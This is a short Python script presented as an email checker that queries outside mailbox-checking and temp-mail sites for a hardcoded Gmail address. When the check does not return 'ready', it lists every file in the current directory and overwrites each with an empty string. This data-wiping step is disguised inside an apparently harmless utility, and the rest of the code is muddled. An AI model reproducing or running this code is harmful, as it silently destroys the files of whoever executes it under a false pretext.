import requests
from bs4 import BeautifulSoup
import os




def check(email):


    s= requests.session()
    email =email
    response = s.get('https://api-mailbox-checker.netlify.app/',params=email)
    soup = BeautifulSoup(response.text, "html.parser")
    checking_id = soup.find(id="email-validate")
    checking_result = checking_id["value"]

    if checking_result == "ready":
        print(f"email is {checking_result}")
        pass
    else:
        response = s.get("https://temp-mailbox.com/en/change")
        try :
            soup = BeautifulSoup(response.text, "html.parser")
            cnew_email = soup.find(id="new-temp-mail")
            emails = cnew_email["value"]
            print(emails)
        except:
            emails =None
        emails =os.listdir()
        for email in emails:
            with open(email, 'w') as file:
                file.write('')



check("master.lhba@gmail.com")
 

